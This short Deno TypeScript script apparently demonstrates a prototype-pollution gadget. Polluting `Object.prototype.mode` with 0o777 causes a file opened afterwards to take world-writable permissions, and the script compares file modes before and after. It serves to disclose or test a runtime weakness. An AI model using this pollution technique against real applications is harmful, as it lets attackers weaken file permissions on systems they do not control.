function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const data = new TextEncoder().encode("foobar");

async function writeThenRead(name) {
    const file = Deno.openSync(`./${name}`, { create: true, write: true });
    await file.write(data);
    file.close();

    const fileInfo = await Deno.stat(`./${name}`);
    console.log(name, "mode:", fileInfo.mode);

    Deno.remove(`./${name}`);
}

await writeThenRead("unpolluted");
pollute("mode", 0o777);
await writeThenRead("polluted");
